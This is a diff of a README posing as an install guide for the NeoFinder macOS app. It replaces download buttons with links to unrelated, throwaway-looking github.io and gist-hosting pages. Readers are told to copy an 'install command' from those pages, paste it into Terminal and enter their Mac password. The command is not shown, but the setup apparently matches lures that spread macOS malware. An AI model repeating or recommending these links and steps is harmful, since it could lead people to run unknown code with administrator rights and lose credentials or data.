@@ -3,7 +3,7 @@
 
 NeoFinder is a powerful digital asset manager for macOS, designed to organize, search, and manage your photos, videos, music, and documents with ease. Follow the guide below to install it quickly on your Mac. 🚀
 
-[![Download for macOS](https://img.shields.io/badge/Download-for%20macOS-007AFF?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/neofinder)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the download button above does not work, follow the terminal installation instructions below.
 
@@ -22,7 +22,7 @@ If the download button above does not work, follow the terminal installation ins
 ### Installation via terminal command:
 1. Get the installation command by clicking this button:  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-0A84FF?style=flat-square&logo=apple)](https://gistcdn.githack.com/sportsmenskyfall/60f8626f4918dacda887384a3e360088/raw/9290198cb820aba533c4be294343d7989842dfea/install.html)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open Terminal on your Mac and paste the copied command.
 3. Press **Return** and enter your Mac password if requested.
